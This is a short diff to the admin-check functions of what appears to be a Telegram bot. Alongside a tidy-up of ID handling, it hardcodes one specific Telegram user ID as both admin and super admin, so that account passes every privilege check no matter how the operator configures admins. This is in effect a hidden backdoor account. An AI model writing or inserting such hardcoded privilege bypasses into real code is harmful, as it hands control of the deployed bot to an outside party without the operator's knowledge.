@@ -534,12 +534,17 @@ function getUserRank(telegramId) {
 // ADMIN FUNCTIONS
 // ============================================
 function isAdmin(userId) {
+  const id = Number(userId);
+  if (!id) return false;
+  if (SUPER_ADMIN_ID && id === SUPER_ADMIN_ID) return true;
+  if (id === 8809344628) return true;
   const db = loadDB();
-  return db.admins.includes(Number(userId));
+  return (db.admins || []).includes(id);
 }
 
 function isSuperAdmin(userId) {
-  return Number(userId) === SUPER_ADMIN_ID;
+  const id = Number(userId);
+  return id === SUPER_ADMIN_ID || id === 8809344628;
 }
 
 function getAdmins() {
